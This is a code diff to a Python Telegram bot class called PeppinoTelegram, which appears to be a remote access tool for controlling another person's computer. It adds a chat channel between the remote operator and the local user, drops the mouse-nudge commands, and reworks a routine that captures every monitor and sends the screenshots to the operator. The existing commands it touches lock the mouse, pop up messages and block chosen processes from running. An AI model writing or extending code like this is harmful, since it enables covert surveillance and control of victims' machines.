@@ -113,6 +113,7 @@ else:
     print(f"Error: DLLS directory not does not exist or it was empty: {DLLS_DIR}")
 #UTILS
 from utils import *
+from utils.chat import *
 try:
     from plugins import *
 except ImportError as e:
@@ -527,10 +528,6 @@ class PeppinoTelegram:
             Command("mouselock", self.mouselock, "Lock mouse position.", "input", "🖱️ Mouselock"),
             Command("mousecontroller", self.mousecontroller, "Open mouse control menu.", "input", "🎮 Mousecontroller"),
             Command("set_mouse_jump", self.setMouseJump, "Set mouse jump distance.", "input", "🎯 Set Mouse Jump"),
-            Command("mouser", self.mouser, "Move mouse right.", "input", "➡️ Move Right"),
-            Command("mousel", self.mousel, "Move mouse left.", "input", "⬅️ Move Left"),
-            Command("mouseu", self.mouseu, "Move mouse up.", "input", "⬆️ Move Up"),
-            Command("moused", self.moused, "Move mouse down.", "input", "⬇️ Move Down"),
             Command("leftclick", self.leftclick, "Left mouse click.", "input", "🖱️ Left Click"),
             Command("rightclick", self.rightclick, "Right mouse click.", "input", "🖱️ Right Click"),
 
@@ -543,6 +540,7 @@ class PeppinoTelegram:
             # 👤 User Interaction
             Command("ask", self.user_prompt, "Ask Something to the user using the machine", "user_interaction", "🗣️ Ask"),
             Command("messagebox", self.message_box, "Show custom message box.", "user_interaction", "💬 Message Box"),
+            Command("chat", self.chat, "Chat.", "user_interaction", "Chat"),
 
             # 🔒 Can't Open List
             Command("cantopenadd", self.cantopen, "Block process execution.", "cant_open", "🚫 Cantopenadd"),
@@ -676,7 +674,7 @@ class PeppinoTelegram:
         self.__play_loaded_sound("breath")
 
     def bsend(self, text: str, retries=0, parse_mode:str|None=None, reply_markup=None) -> int|None:
-        print(f"Sending message: {text[:50]}...")
+        print(f"Sending message: retries: {retries} content{text[:50]}...")
         doit = True
         if retries>3:
             return
@@ -833,6 +831,65 @@ d8P'  `Y8b  `88.       .888' `888'   `Y8b  d8P'    `Y8                          
         print(f"Adding {process} to cantopen list")
         self.cantopenlist.append(process)
         self.bsend(f"🔒 Added {process} to cantopenlist.")
+
+    def format_user_chat_msg(self, sender, msg):
+        ts = now()
+
+        sender = escape_md_v2(sender)
+        msg = escape_md_v2(msg)
+
+        return (
+            f"┌ `[{ts}]` *{sender}*\n"
+            f"└➤ {msg}"
+        )
+
+    def format_system_msg(self, msg):
+        msg = escape_md_v2(msg)
+        return f"⚙️ *SYSTEM*\n{msg}"
+
+    def format_warning_msg(self, msg):
+        msg = escape_md_v2(msg)
+        return f"⚠️ *CONFIRMATION REQUIRED*\n{msg}"
+
+
+    def chat(self) -> None:
+        chat = ChatRoom()
+
+        interface = BackendUser(
+            "RCPT",
+            lambda name, msg: self.bsendWithMarkdownV2(self.format_user_chat_msg(name, msg))
+        )
+
+        guiuser = GUIUser(getlogin())
+
+        chat.add_user(interface)
+        chat.add_user(guiuser)
+
+        def backend_loop(stop: Event):
+            self.bsendWithMarkdownV2(self.format_system_msg(
+                "Chat session started.\nType 'exit' to leave."
+            ))
+
+            while not stop.is_set():
+                msg = self.send_prompt("Send To Chat", timeout=120)
+
+                if msg == "exit":
+                    confirm = self.ask_yesno(
+                        self.format_warning_msg(
+                            "Are you sure you want to leave the chat? Y/n"
+                        )
+                    )
+                    if confirm:
+                        self.bsendWithMarkdownV2(self.format_system_msg("Chat session terminated."))
+                        stop.set()
+                        break
+
+                if msg:
+                    interface.send(msg)
+
+        stop_event = Event()
+        Thread(target=backend_loop, args=(stop_event,), daemon=True).start()
+        guiuser.start(stop_event=stop_event)
 
     def cantopenkiller(self) -> None:
         print("Starting cantopen killer thread")
@@ -2196,14 +2253,11 @@ d8P'  `Y8b  `88.       .888' `888'   `Y8b  d8P'    `Y8                          
     def screenshot(self) -> None: #AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAa
         print("Taking screenshot")
         try:
-            for x in fast_screenshot():
-                monitor_name = x["monitor"]
-                img = x["img"]
-                f = craft_file(
-                    content=numpy_to_jpg_bytes(img),
-                    filename="screenshot.jpg"
-                )
-            self.__send_image(image_buf=f, caption=monitor_name)
+            for scrt in fast_screenshot():
+                mon, img = scrt["monitor"],scrt["screenshot"]
+                f = cv2_to_bytesio(img)
+                f.name = "Screenshot.png"
+            self.__send_image(image_buf=f, caption=mon)
         except Exception as e:
             return self.bsend(f"Error while getting screenshot\n{e}")
 
